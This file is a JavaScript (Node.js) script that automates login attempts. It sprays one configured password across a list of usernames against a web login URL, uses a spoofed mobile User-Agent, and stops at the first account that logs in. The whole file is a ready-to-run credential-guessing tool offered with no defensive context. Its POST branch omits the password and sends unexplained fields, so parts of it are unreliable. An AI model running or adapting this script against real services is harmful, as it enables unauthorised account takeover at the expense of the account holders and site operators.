import  fs from 'fs';
import axios from 'axios';
import chalk from 'chalk';
const CONFIG_FILE = 'config.json';

function loadConfig() {
    return JSON.parse(fs.readFileSync(CONFIG_FILE, 'utf8'));
}

let { url: LOGIN_URL, method: METHOD, password } = loadConfig();

async function attemptLogin(username) {
    try {
        const headers = {
            'Accept-Language': 'en-US,en;q=0.9',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10)',
            'Content-Type': 'application/x-www-form-urlencoded',
        };

        const data = new URLSearchParams({
                username,
                var: 'callBack', // المتغير المطلوب
                verfiy:false
            });

        let response;

        if (METHOD === 'POST') {
            response = await axios.post(LOGIN_URL, data, { headers });
        } else {
            response = await axios.get(LOGIN_URL, {
                params: { username, password },
                headers
            });
        }

        if (response.data.logged_in === 'yes') {
            console.log(chalk.green(`[+] Logged in: ${username}`));
            return true;
        } else {
            console.log(chalk.red(`[-] Failed login: ${username}`));
            return false;
        }

    } catch (err) {
        console.log(chalk.red(`[!] Error with ${username}: ${err.message}`));
        return false;
    }
}

(async function runLoginCheck() {
    let lines = fs.readFileSync('valid_usernames.txt', 'utf-8').split(/\r?\n/);
    let usernames = lines
    .filter(line => line.trim() !== "")
    .map(line => line.split("-")[0].trim());

    for (let username of usernames) {
        const success = await attemptLogin(username);
        if (success) {
            console.log(chalk.blue(`[+] Stopping after successful login.`));
            break;
        } else {
            fs.appendFileSync('used_usernames.txt', username + "\n");

            usernames = usernames.filter(u => u !== username);
            fs.writeFileSync('valid_usernames.txt', usernames.join("\n"));
        }
    }
})();

